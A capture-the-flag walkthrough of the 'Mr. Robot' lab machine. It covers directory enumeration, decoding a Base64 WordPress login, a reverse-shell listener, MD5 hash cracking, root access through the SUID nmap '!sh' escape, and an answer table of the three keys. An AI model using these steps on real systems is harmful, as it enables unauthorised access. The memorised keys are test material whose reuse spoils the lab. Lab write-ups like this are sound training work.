# Mr. Robot CTF

## Task 1: Connect to our Network  
## Task 2: Hack the Machine  

*Credit to Leon Johnson for creating this machine. This machine is used here with the explicit permission of the creator <3*

---

## Questions to Answer

- What is key 1?  
- What is key 2?  
- What is key 3?  

---

# Initial Reconnaissance

First, we ping the target machine to ensure connectivity:

```bash
ping MACHINE_IP
```

Next, we run an Nmap scan on specific ports:

```bash
nmap -sC -sV -p port MACHINE_IP
```

We enumerate directories using dirsearch:

```bash
dirsearch -u http://MACHINE_IP/
```

The output includes several interesting paths:

```bash
/admin/
/readme
/robots.txt
/wp-login
/wp-login.php
```

Finding Key 1
Inside robots.txt, we discover a wordlist and the first key:
User-agent: *
fsocity.dic
key-1-of-3.txt
The first key is stored in key-1-of-3.txt: 073403c8a5(_)
➡️ Key 1: 073403c8a5

Additional Recon
Readme File

Opening:

```bash
http://MACHINE_IP/readme
```

Output:
I like where your head is at. However I'm not going to help you.
License File
Opening:

```bash
http://MACHINE_IP/license
```

We find a Base64-encoded credential:

```bash
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoding it:

```bash
elliot:ER28-0652
```

These are valid WordPress credentials.

Gaining Shell Access
We upload a PHP reverse shell (commonly found on GitHub), then start a listener:

```bash
rlwrap nc -lvnp 5555
```

Cracking the Password Hash
The robots.txt file references fsocity.dic, which we use as a wordlist.
An MD5 password hash is also present.

We crack it using John the Ripper:

```bash
john --format=raw-md5 --wordlist=rockyou.txt robot.txt
```

The cracked password is:

```bash
abcdefghijklmnopqrstuvwxyz
```

We switch to the robot user:

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
whoami
robot
```

Privilege Escalation<br>
<br>

We search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

We notice:

```bash
/usr/local/bin/nmap
```

Nmap (older versions) allows interactive mode, which can execute shell commands.
<br>
Using GTFOBins:

```bash
nmap --interactive
nmap> !sh
```

We now have a root shell:

```bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

Finding Key 2
Inside the robot user directory:

```bash
cd /home/robot
ls
key-2-of-3.txt
password.raw-md5
```

Reading it:

```bash
cat key-2-of-3.txt
```
<br>
➡️ Key 2: 822c73956<br>
<br>

Finding Key 3
We search for the last key:

```bash
find / -name "key-3-of-3.txt" 2>/dev/null
```

The file is located in /root/:

```bash
cd /root
cat key-3-of-3.txt
```

Output:

➡️ Key 3: 04787ddef2<br>

Final Answers
Key	Value
Key 1	073403c8a5
Key 2	822c73956
Key 3	04787ddef2

